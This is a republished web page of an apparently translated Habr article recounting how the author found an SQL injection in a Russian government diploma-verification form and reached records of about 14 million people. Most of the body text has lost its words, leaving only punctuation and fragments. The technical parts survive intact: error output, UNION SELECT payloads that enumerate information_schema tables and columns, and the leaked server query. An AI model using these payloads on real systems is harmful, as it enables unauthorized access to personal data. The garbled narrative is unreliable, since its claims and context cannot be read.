<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>And so it will do ... or how the data of 14 million Russians were in my hands</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Lonely evening, looking at my empty record book and realizing that the end was near, I again thought about how I could now pack a bag, or even just a ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>And so it will do ... or how the data of 14 million Russians were in my hands</h1><div class="post__text post__text-html js-mediator-article">  Lonely evening, looking at my empty record book and realizing that the end was near, I again thought about how I could now pack a bag, or even just a backpack, put a shirt and shorts in there and dump it into a warm country.  It would be good, but with a diploma, life is much better.  In any case, they always say that to me. <br><br>  I also often heard a lot of stories about people who came for interviews with honors from Moscow State University, but they didn‚Äôt understand their profession at all, and then they admitted at corporate events that they had bought a diploma. <br><br>  But the times are different now, now the 21st century, the century of great opportunities, any employer who knows how to use the mouse and knows what the browser looks like on the desktop can check the diploma data.  Each diploma that is issued by an educational institution is now registered in a single register, which everyone has access to through the website of the <a href="http://frdocheck.obrnadzor.gov.ru/">Federal Service for Supervision in Education and Science</a> . 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/eb6/471/a1f/eb6471a1f7473e5163e445d9c3347444.png" alt="image"></div><br><blockquote>  <b>Warning:</b> do not try to repeat the steps described in the publication and the like.  Remember <a href="http://www.consultant.ru/document/cons_doc_LAW_10699/5c337673c261a026c476d578035ce68a0ae86da0/">Art.</a>  <a href="http://www.consultant.ru/document/cons_doc_LAW_10699/5c337673c261a026c476d578035ce68a0ae86da0/">272 of the Criminal Code</a> "Wrongful access to computer information." </blockquote><br><a name="habracut"></a>  To get information about the education document, simply fill out the form, move the slider, and click.  You will either be shown information about the document, or they will say that there is no such thing (but it is still too early to blame the applicant for deception, is it not enough what could have happened). <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/c38/3e6/096/c383e60967d547f62fa91908b6ddd6a6.jpg" alt="image"></div><br>  Well, while I looked at this form, I decided to play with it.  He led all kinds of nonsense, and bang - on the field in which <b>1 '</b> was entered, I get the following response: <br><br><pre><code class="php">&lt;h2&gt; &lt;/h2&gt;
&lt;p&gt;SQLSTATE[42601]: Syntax error: 7 ERROR:  syntax error at or near "4"
LINE 6: ...me) = UPPER('1'')) AND (doc.education_level_id = '4') AND (U...
                                                             ^&lt;/p&gt;</code></pre><br>
 SQL Injection. ,         .    ,  . ,   .        .<br>
<br>
          ,   ,    ,         .   ,     ‚Äî  .<br>
<br>
            ,      ,   SELECT .    -   ,   php-,       .<br>
<br>
            , - : <br>
<br>
<div class="spoiler"><b class="spoiler_title"></b><div class="spoiler_text">...me) = UPPER('<font color="red">1') AND (1=0)) ‚Äî </font>')) AND (doc.education_level_id = '4') AND (U‚Ä¶<br>
</div></div><br>
      ,    .<br>
<br>
     , , .     -   id.  id=1, id=1024  ,    . , id     <i>(:  )</i>.<br>
<br>
      ,     .   ,    , , ,  -.           .      .<br>
<br>
      -  .       ,      , , <i>SELECT id, name, count</i>,     .   ,    ,      , , , ?      ,     <i>ORDER BY</i>.   ?<br>
<br>
<i>ORDER BY</i>   ,         ,      .     ,     ‚Äî   .      .   55.<br>
<br>
 ,     ,      ? ,   MySQL,  MySQL   <i>Version()</i>,    . :<br>
<br>
<div class="spoiler"><b class="spoiler_title"></b><div class="spoiler_text">...me) = UPPER('<font color="red">1') AND (1=0)) UNION SELECT 1,version(),<s>  53 ,       </s> ‚Äî </font>')) AND (doc.education_level_id = '4') AND (U‚Ä¶<br>
</div></div><br>
   JSON,   :<br>
<br>
<pre><code>PostgreSQL 9.1.2 on x86_64-alt-linux-gnu, compiled by x86_64-alt-linux-gcc (GCC) 4.5.3 20120111 (ALT Linux 4.5.3-alt1.M60C.1), 64-bit
</code></pre><br>
,   ,   (     ).    . ,   :<br>
<br>
<div class="spoiler"><b class="spoiler_title"></b><div class="spoiler_text">...me) = UPPER('<font color="red">1') AND (1=0)) UNION SELECT 1,current_query(),<s>  53 ,       </s> ‚Äî </font>')) AND (doc.education_level_id = '4') AND (U‚Ä¶<br>
</div></div><br>
:<br>
<br>
<pre><code>"SELECT "doc".*, "doc_type"."type", "stat"."name" AS "status", "level"."name" AS "level", "rec"."name" AS "rec_name", "rec"."surname" AS "rec_surname", "rec"."patronymic" AS "rec_lastname" FROM "documents" AS "doc" LEFT JOIN "document_types" AS "doc_type" ON doc_type.id = doc.document_type_id LEFT JOIN "document_packages" AS "dp" ON doc.document_package_id = dp.id LEFT JOIN "documents_status" AS "stat" ON stat.id = doc.status_id LEFT JOIN "education_levels" AS "level" ON level.id = doc.education_level_id LEFT JOIN "recipients" AS "rec" ON rec.id = doc.recipient_id WHERE (dp.status = 3) AND (doc.organization_id = '573') AND (doc.year = '2018-01-01') AND (UPPER(rec.surname) = UPPER('1')) UNION SELECT 1,current_query(),'3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '01.01.1970', '01.01.1970', '21', '01.01.1970', '23', '24', '25', '26', '01.01.1970', '28', '29', '30', '31', '32', '33', '28-05-2004 11:11:59', '35', '36', '28-05-2004 11:11:59', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55' -- ')) AND (doc.education_level_id = '4') AND (UPPER(doc.series) = UPPER('1')) AND (doc.number = '1') LIMIT 1"</code></pre><br>
   .<br>
<br>
 ,         :<br>
<br>
<div class="spoiler"><b class="spoiler_title"></b><div class="spoiler_text">...me) = UPPER('<font color="red">1') AND (1=0)) UNION SELECT 1,table_name,<s>  53 ,       </s> FROM information_schema.tables ‚Äî </font>')) AND (doc.education_level_id = '4') AND (U‚Ä¶<br>
</div></div><br>
    .      :<br>
<br>
<div class="spoiler"><b class="spoiler_title"></b><div class="spoiler_text">...me) = UPPER('<font color="red">1') AND (1=0)) UNION SELECT 1,CONCAT(column_name,' ',data_type,' ',is_nullable),<s>  53 ,       </s> FROM information_schema.columns WHERE table_name='<s>-  </s>' ‚Äî </font>')) AND (doc.education_level_id = '4') AND (U‚Ä¶<br>
</div></div><br>
,    ,              .  :<br>
<br>
     (, ,  ,  , <b>!</b>, <b>!!</b>,     ( ,     ,   !),  ,  (?),  ,  ),      (  :   ),     (, , email, , , md5  ,    ),   admin    ( : ,    ),       ( , email, ,  ‚Äî   ,       )     .<br>
<br>
  :  14 000 000   ,  14 000 000      , 1322  , 1 ,      , ,    , 3391          .   5 .<br>
<br>
  ,    .  , - ?     , ip    -? !<br>
<br>
,          (    , ).       .                 ,    <a href="https://habrahabr.ru/post/347262/"></a>.<br>
<br>
      .  , ,      md5, ,   ,           .   -  .<br>
<br>
        ?         ?  ,      .     ,  - ‚Ä¶<br>
<br>
<b>UPD:</b>   ,    . ,   ,       .        ,        ,     .  ,        .      ,       , ,     ,        .   ,       - .   :  ,     ,   3-    , ,    .</div><p>Source: <a href="https://habr.com/ru/post/347760/">https://habr.com/ru/post/347760/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../347750/index.html">Learn OpenGL. Lesson 4.6 - Cubic cards</a></li>
<li><a href="../347752/index.html">Spring AOP. Little question from the interview</a></li>
<li><a href="../347754/index.html">JavaScript proxy: beautiful and useful</a></li>
<li><a href="../347756/index.html">SuperJob IT meetup. Work with business requirements at different project scales</a></li>
<li><a href="../347758/index.html">Nonrandom chance, or Attack on PRNG in .NET</a></li>
<li><a href="../347764/index.html">20 times cheaper, 2.5 times more accurate and twice as convenient</a></li>
<li><a href="../347768/index.html">Conservative national crypto regulation. What do new bills carry us?</a></li>
<li><a href="../347770/index.html">Industrial barcode scanners: new technologies in AutoID</a></li>
<li><a href="../347772/index.html">MentorHack: Tinder for Mentor Search, AI Boss and a bit of HRTech</a></li>
<li><a href="../347774/index.html">Laziness worked instagram</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>